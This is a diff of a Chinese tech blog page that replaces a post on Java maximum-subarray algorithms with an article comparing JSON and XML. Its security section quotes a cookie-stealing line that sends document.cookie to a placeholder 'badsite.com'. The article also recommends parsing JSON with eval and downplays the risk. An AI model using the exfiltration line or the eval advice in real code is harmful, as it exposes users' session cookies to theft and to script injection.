@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>数组中的最大子序列 | MESSI20133&#39;S BLOG</title>
+  <title>json与xml的区别 | MESSI20133&#39;S BLOG</title>
   <meta name="author" content="messi20133">
   
   <meta name="description" content="">
@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="数组中的最大子序列"/>
+  <meta property="og:title" content="json与xml的区别"/>
   <meta property="og:site_name" content="MESSI20133&#39;S BLOG"/>
 
   <link rel="alternate" href="/atom.xml" title="MESSI20133&#39;S BLOG" type="application/atom+xml">
@@ -57,40 +57,30 @@
     <header>
       
         <div class="icon"></div>
-        <time datetime="2014-06-09T08:35:07.000Z"><a href="/2014/06/09/maxsubarray/">6月 9 2014</a></time>
+        <time datetime="2014-07-15T05:04:04.000Z"><a href="/2014/07/15/json/">7月 15 2014</a></time>
       
       
   
-    <h1 class="title">数组中的最大子序列</h1>
+    <h1 class="title">json与xml的区别</h1>
   
 
     </header>
     <div class="entry">
       
-        <p><a id="more"></a><br>求数组中的最大子序列。<br>例如：给定一个序列[−2,1,−3,4,−1,2,1,−5,4],最大子序列是[4,−1,2,1] ，合是6.<br>这里采用两种方式求解<br>方法一：普通方法：</p>
-<pre><code><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> maxSubArray2(<span class="keyword">int</span> A[]){
-    <span class="keyword">int</span> max=Integer.MIN_VALUE;
-    <span class="keyword">int</span> <span class="keyword">sum</span>=<span class="number">0</span>;
-    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;A.length;i++){
-        <span class="keyword">sum</span>+=A[i];
-        max=Math.max(max,<span class="keyword">sum</span>);
-        <span class="keyword">if</span>(<span class="keyword">sum</span>&lt;<span class="number">0</span>)
-            <span class="keyword">sum</span>=<span class="number">0</span>;
-    }
-    <span class="keyword">return</span> max;
+        <p><a id="more"></a><br>JSON(Javascript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写。同时也易于机器解析和生成。它基于Javascript Programming Language, Standard ECMA-262 3rd Edition – December 1999的一个子集。JSON采用完全独立于语言的文本格式，但是也使用了类似于C语言家族的习惯（包括C, C++, C#, Java, Javascript, Perl, Python等）。这些特性使JSON成为理想的数据交换语言。 正是因为这样，twitter已经声称他们的流媒体API将不再支持XML，Foursquare则强烈推荐开发者在使用他们的API时选择JSON，因 为他们计划下一代接口只支持JSON。<br>我们将从下面几个方面来客观比较一下两者<br><strong>可读性</strong><br>两者都具备很好的可读性，但从实际应用出发，个人还是觉得XML文档的可读性无疑会更高，要求你从一大堆的json代码里看出它的结构层次关系还是 相对比较困难的；而且现在很多的IDE工具都可以把XML格式化成易读的结构形式，看起来相当舒服，而json则不然。<br><strong>是否易于在服务端创建数据</strong><br>XML已经流行了好多年了，故目前流行的编程语言都已经存在大量的XML数据绑定API去进行创建XML，以java语言为例，你既可以用JAXB，又可以用XmlBeans，又或者dom4j、jdom等去把数据写到xml文件中。而另一方面，json这一方面的API则相对是一个全新的领域，尽管如此，json官方网站还是列出了很多令人印象深刻的各种语言的API，java方面比较著名的有json-lib，此外gson也算一个。在这一方面，虽然json相对于XML并不是望尘莫及，但还是略微逊色一筹，尤其是在复杂的应用方面，XML方面的API已经存在多年，相对来说成熟稳定得多了。<br><strong>是否易于在客户端处理数据</strong><br>在客户端，要处理XMLHttpRequest请求返回的json格式响应数据是一件轻而易举的事情，只需要使用javascript的eval函 数就可以实现把json格式的数据转换成javascript对象，然后通过对象的属性去访问值，这就是json最优雅之处，无数人为之着迷。而XML在 这一方面就不是那么的友善了，曾令无数的程序员头痛不已，因为处理XML响应数据，你得通过DOM树，这是非常繁琐且容易出错的工作。<br><strong>扩展性</strong><br>可扩展性有助于减少生产者与消费者之间的数据耦合。在AJAX应用里，客户端脚本应该合理地兼容不可知的数据扩展。毫无疑问，XML是可扩展的，但它的扩展是有局限的，因为如果你要适应扩展的话，那么你的客户端代码不得不作出相应的改动，如以下的客户端解析代码</p>
+<pre><code><span class="built_in">var</span> <span class="built_in">xml</span> <span class="subst">=</span> xhr<span class="built_in">.</span>responseXML;  
+<span class="built_in">var</span> elements <span class="subst">=</span> <span class="built_in">xml</span><span class="built_in">.</span>getElementsByTagName(<span class="string">"firstName"</span>);  
+<span class="built_in">var</span> firstNameEl <span class="subst">=</span> elements<span class="preprocessor">[</span><span class="number">0</span><span class="preprocessor">]</span><span class="markup">;  
+var lastNameEl = firstNameEl.nextSibling;</span>
+</code></pre><p>如果你在响应xml中<firstName>结点后增加了<middlename>这一结点的话，那以上的代码就要作相应 的改变，否则会出错，也就是说，XML的扩展得伴随着解析代码的变更，这可没有什么魔法可言。而json则简单得多，即使你要增加middleName这 一属性，在js客户端依然是通过对象访问属性值即可，而不会引起js上的语法出错之类的错误，导致程序无法执行。<br><strong>调试和故障排除</strong><br>这方面需要从服务端和客户端两方面进行考虑，在服务器端，要确保数据是格式良好的和有效的；在客户端，它应该容易调试错误的。<br>    使用XML的话会相对容易地检查数据被发送到客户端是格式良好的和有效的。您还可以使用数据架构（schema）来验证xml的正确性和有效性。使用JSON，这个任务是手动的，并涉及验证响应对象中是否包含正确的属性。<br>    在客户端，要从两者中找到错误都是比较困难的。对于XML，浏览器是完全无法将xml格式化成responseXML；如果对于数据量较少的json数据，还可以通过firebug来发现错误，但对于大数据量的话，那只能靠手工检查了，否则也只能坐以待毙了。<br><strong>安全性</strong><br>有人认为，使用json是不安全的，原因是json里可以包含js代码，而客户端中使用eval可以使这些代码执行，而这些代码可能会存在安全隐患。如以下的代码：</p>
+<pre><code>window<span class="preprocessor">.location</span> = <span class="string">"&lt;a href="</span>http://badsite<span class="preprocessor">.com</span>/<span class="string">"&gt;http://badsite.com&lt;/a&gt;?"</span> + document<span class="preprocessor">.cookie</span><span class="comment">;  </span>
+person : {  
+ <span class="string">"firstName"</span> : <span class="string">"Subbu"</span>,  
+ <span class="string">"lastName"</span> : <span class="string">"Allamaraju"</span> 
 }
-</code></pre><p>方法二：动态规划法</p>
-<pre><code>public static <span class="keyword">int</span> maxSubArray1(<span class="keyword">int</span> A[]){
-    <span class="keyword">int</span> <span class="built_in">max</span>=A[<span class="number">0</span>];
-    <span class="keyword">int</span>[] sum=new <span class="keyword">int</span>[A.<span class="built_in">length</span>];
-    sum[<span class="number">0</span>]=A[<span class="number">0</span>];
-    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;A.<span class="built_in">length</span>;i++){
-        sum[i]=Math.<span class="built_in">max</span>(A[i], sum[i-<span class="number">1</span>]+A[i]);
-        <span class="built_in">max</span>=Math.<span class="built_in">max</span>(<span class="built_in">max</span>,sum[i]);
-    }
-    <span class="keyword">return</span> <span class="built_in">max</span>;
-}
-</code></pre>
+</code></pre><p>上面的代码会导致浏览器把用户的cookie数据提交到一个流氓网站。但出现这种情况的可能只会是开发者故意为之，别人是无法这样做的，但如果是开 发者有意为之的话，那他一样以别的方式来实现把你的cookie数据提交到流氓网站，这与是否使用json无关，所以相对于XML，json是同样的安全的。<br><strong>数据交换格式比较之关于轻量级和重量级：</strong><br>轻量级和重量级是相对来说的，那么XML相对于JSON的重量级体现在哪呢？我想应该体现在解析上，XML目前设计了两种解析方式：DOM和SAX；</p>
+<p>　　DOM是把一个数据交换格式XML看成一个DOM对象，需要把XML文件整个读入内存，这一点上JSON和XML的原理是一样的，但是XML要考虑 父节点和子节点，这一点上JSON的解析难度要小很多，因为JSON构建于两种结构：key/value，键值对的集合；值的有序集合，可理解为数组；<br>　　SAX不需要整个读入文档就可以对解析出的内容进行处理，是一种逐步解析的方法。程序也可以随时终止解析。这样，一个大的文档就可以逐步的、一点一点的展现出来，所以SAX适合于大规模的解析。这一点，JSON目前是做不到得。<br>　　所以，JSON和XML的轻/重量级的区别在于：JSON只提供整体解析方案，而这种方法只在解析较少的数据时才能起到良好的效果；而XML提供了对大规模数据的逐步解析方案，这种方案很适合于对大量数据的处理。<br>　<strong>数据交换格式比较之关于数据格式编码及解析的难度：</strong><br>　在编码上，虽然XML和JSON都有各自的编码工具，但是JSON的编码要比XML简单，即使不借助工具，也可以写出JSON代码，但要写出好的 XML代码就有点困难；与XML一样，JSON也是基于文本的，且它们都使用Unicode编码，且其与数据交换格式XML一样具有可读性。<br>　　主观上来看，JSON更为清晰且冗余更少些。JSON网站提供了对JSON语法的严格描述，只是描述较简短。从总体来看，XML比较适合于标记文档，而JSON却更适于进行数据交换处理。<br>　　在解析上，在普通的web应用领域，开发者经常为XML的解析伤脑筋，无论是服务器端生成或处理XML，还是客户端用 JavaScript 解析XML，都常常导致复杂的代码，极低的开发效率。</p>
+
       
     </div>
     <footer>
@@ -98,13 +88,13 @@
         
   
   <div class="categories">
-    <a href="/categories/算法/">算法</a>, <a href="/categories/算法/动态规划/">动态规划</a>
+    <a href="/categories/json/">json</a>
   </div>
 
         
   
   <div class="tags">
-    <a href="/tags/动态规划/">动态规划</a>
+    <a href="/tags/json/">json</a>
   </div>
 
         <div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone"></a><a href="#" class="bds_tsina" data-cmd="tsina"></a><a href="#" class="bds_tqq" data-cmd="tqq"></a><a href="#" class="bds_renren" data-cmd="renren"></a><a href="#" class="bds_weixin" data-cmd="weixin"></a></div>
@@ -119,7 +109,7 @@
 
 <section id="comment">
   <!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="2014/06/09/maxsubarray/"></div>
+	<div class="ds-thread" data-thread-key="2014/07/15/json/"></div>
 <!-- 多说评论框 end -->
 <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 <script type="text/javascript">
